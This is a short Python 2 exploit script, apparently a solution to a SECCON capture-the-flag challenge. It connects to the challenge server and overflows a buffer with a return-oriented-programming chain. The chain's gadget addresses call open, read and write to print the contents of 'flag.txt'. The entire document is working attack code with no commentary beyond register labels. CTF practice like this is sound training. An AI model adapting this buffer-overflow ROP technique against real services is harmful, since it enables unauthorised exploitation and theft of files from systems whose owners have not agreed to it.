#!/usr/bin/python
import struct
import socket
import telnetlib
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data
def p(v):
    return struct.pack('>I', v)
def u(v):
    return struct.unpack('>I', v)[0]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('micro.pwn.seccon.jp', 10000))
f = s.makefile('rw', bufsize=0)
print readuntil(f, 'Input password: ')
flag_txt_addr = 0x4319
pop_r7_r6_r5_r4_pc_r8 = 0x424c
syscall_ret = 0x4028
data_addr = 0xffa000
printout = 0x42a0
rop = 'A' * 16 # padding
rop += p(pop_r7_r6_r5_r4_pc_r8)
rop += p(0x41414141) # r8
rop += p(0x0) # r7 modes
rop += p(0x0) # r6 flags
rop += p(flag_txt_addr) # r5 'flag.txt'
rop += p(0x5) # r4 -> open
rop += p(syscall_ret)
rop += p(0x41414141) # r8
rop += p(pop_r7_r6_r5_r4_pc_r8)
rop += p(1000) # r7 count
rop += p(data_addr) # r6 buffer
rop += p(0x3) # r5 fd
rop += p(0x3) # r4 -> read
rop += p(syscall_ret)
rop += p(0x41414141) # r8
rop += p(pop_r7_r6_r5_r4_pc_r8)
rop += p(1000) # r7 count
rop += p(data_addr) # r6 buffer
rop += p(0x1) # r5 fd
rop += p(0x4) # r4 -> write
rop += p(syscall_ret)
rop += p(0x41414141) # r8
f.write(rop + '\n')
print (f.read(1024))
